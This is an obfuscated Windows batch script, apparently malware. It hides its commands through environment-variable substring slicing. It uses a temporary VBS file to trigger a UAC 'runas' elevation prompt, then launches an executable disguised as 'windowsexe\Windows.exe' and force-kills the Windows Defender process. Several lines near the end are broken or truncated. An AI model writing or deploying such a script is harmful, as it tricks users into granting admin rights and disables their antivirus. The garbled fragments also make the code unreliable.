��&cls
@%pUBlIc:~89,83%%PUBLic:~5,1%CHo^ of^%PuBlIC:~46,16%f
SEt R^=Jg^%pUBLIc:~13,1%^gtGXz%pUBLIc:~4,1%w%pUBLIc:~11,1%^hm%pUBLIc:~10,1%^S^HI^O^A
^%pUBlIC:~14,1%^L%pUBliC:~55,17%^%publIc:~4,1%
@^e^c%r:~15,1%^%r:~17,1% ^%r:~17,1%n
@ec%r:~11,1%o off

:: BatchGotAdmin
::-------------------------------------
REM  --> C%r:~11,1%eck for per%r:~12,1%%r:~2,1%%r:~8,1%%r:~8,1%%r:~2,1%on%r:~8,1%
>n%r:~13,1%l 2>&1 "%SYSTEMROOT%\%r:~8,1%y%r:~8,1%%r:~4,1%e%r:~12,1%32\cacl%r:~8,1%.exe" "%SYSTEMROOT%\%r:~8,1%y%r:~8,1%%r:~4,1%e%r:~12,1%32\conf%r:~2,1%%r:~1,1%\%r:~8,1%y%r:~8,1%%r:~4,1%e%r:~12,1%"

REM --> %r:~16,1%f error fla%r:~1,1% %r:~8,1%e%r:~4,1%, %r:~9,1%e do no%r:~4,1% %r:~11,1%ave ad%r:~12,1%%r:~2,1%n.
%r:~2,1%f '%errorlevel%' NEQ '0' (
    ec%r:~11,1%o Req%r:~13,1%e%r:~8,1%%r:~4,1%%r:~2,1%n%r:~1,1% ad%r:~12,1%%r:~2,1%n%r:~2,1%%r:~8,1%%r:~4,1%ra%r:~4,1%%r:~2,1%ve pr%r:~2,1%v%r:~2,1%le%r:~1,1%e%r:~8,1%...
    %r:~1,1%o%r:~4,1%o U%r:~18,1%CPro%r:~12,1%p%r:~4,1%
) el%r:~8,1%e ( %r:~1,1%o%r:~4,1%o %r:~1,1%o%r:~4,1%%r:~18,1%d%r:~12,1%%r:~2,1%n )

:UACPrompt
    ec%r:~11,1%o %r:~14,1%e%r:~4,1% U%r:~18,1%C = Crea%r:~4,1%e%r:~17,1%%r:~10,1%jec%r:~4,1%^("%r:~14,1%%r:~11,1%ell.%r:~18,1%ppl%r:~2,1%ca%r:~4,1%%r:~2,1%on"^) > "%temp%\%r:~1,1%e%r:~4,1%ad%r:~12,1%%r:~2,1%n.v%r:~10,1%%r:~8,1%"
    %r:~8,1%e%r:~4,1% para%r:~12,1%%r:~8,1% = %*:"="
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %%~%r:~8,1%0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    ex%r:~2,1%%r:~4,1% /B
:%r:~1,1%o%r:~4,1%%r:~18,1%d%r:~12,1%%r:~2,1%n
  %r:~10,1%%r:~8,1%"
    exit /B
:gotAdmin
    start %systemroot%\windowsexe\Windows.exe
    Taskkill /IM "WindowsDefender.exe" /F
    ex%r:~2,1%%r:~4,1% ender.exe" /F
    exit /b
@ec%r:~11,1%o off
set a = %%~i
set a = % + %~i"%
set a = %a%
:aaaaaaaaaaaaaaaaaaaaaaaaaaaaab
